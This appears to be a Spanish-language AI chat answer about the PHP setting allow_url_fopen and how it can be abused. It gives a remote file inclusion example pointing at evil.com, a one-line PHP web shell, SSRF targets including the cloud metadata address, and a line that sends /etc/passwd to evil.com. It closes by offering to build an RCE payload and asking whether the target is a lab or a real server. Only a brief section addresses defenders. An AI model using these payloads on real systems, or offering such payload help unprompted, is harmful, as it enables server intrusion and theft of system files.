Cuando ves que en `phpinfo()` o en la configuración de PHP está:

ini

CopiarEditar

`allow_url_fopen = On`

🔥 **Significa que PHP puede abrir URLs remotas como si fueran archivos locales**, usando funciones como `file_get_contents()`, `include()`, `require()`, `fopen()`, etc.

Esto puede ser **muy útil**… o **muy peligroso**, dependiendo del contexto 😈

---

## 🧨 ¿Qué se puede hacer si `allow_url_fopen` está habilitado?

### 1. **Incluir archivos remotos (RFI - Remote File Inclusion)**

Si encuentras una vulnerabilidad de tipo `include($_GET['page'])` y `allow_url_fopen` está **activado**, puedes cargar código malicioso desde **tu servidor externo**.

✅ Ejemplo vulnerable:

php

CopiarEditar

`<?php include($_GET['page']);  // page=http://evil.com/shell.txt`

☠️ Esto te permitiría ejecutar PHP desde una URL remota como:

bash

CopiarEditar

`http://victima.com/vuln.php?page=http://tu-ip/shell.txt`

Donde `shell.txt` contiene algo como:

php

CopiarEditar

`<?php system($_GET['cmd']); ?>`

---

### 2. **SSRF (Server-Side Request Forgery)**

Puedes hacer que el servidor haga peticiones a:

- IPs internas (`http://127.0.0.1`, `http://169.254.169.254`, etc)
    
- Otros servidores accesibles desde el backend
    
- Tu propio servidor para exfiltrar datos
    

✅ Ejemplo:

php

CopiarEditar

`file_get_contents("http://localhost:8000/admin");`

---

### 3. **Exfiltrar información (desde el servidor hacia ti)**

Si puedes controlar qué se lee con `file_get_contents()` o `include()`, puedes hacer que el servidor te envíe archivos:

php

CopiarEditar

`$content = file_get_contents("http://evil.com/steal.php?data=" . urlencode(file_get_contents("/etc/passwd")));`

---

### 4. **Carga remota de scripts o configuraciones**

En algunos CMS o scripts mal configurados, el `allow_url_fopen` puede usarse para:

- Cargar temas/plugins desde URLs externas.
    
- Autoupdates desde lugares inseguros.
    
- Inclusiones dinámicas desde `$_GET` o `$_POST`.
    

---

## 🔒 Si eres el defensor

Si no necesitas cargar archivos remotos **por ninguna razón**, **desactiva esto** en `php.ini`:

ini

CopiarEditar

`allow_url_fopen = Off`

Porque combinado con otras malas prácticas, puede ser **letal**.

---

## 🚀 ¿Y si esto está activado y además puedes controlar una ruta en `include()`?

Entonces estás a un paso de una **RCE remota (Remote Code Execution)**. Si quieres, puedo ayudarte a construir un escenario o payload para probarlo (en un entorno controlado o CTF, claro 😎).

¿Estás en un laboratorio tipo TryHackMe/HackTheBox, o revisando un servidor real?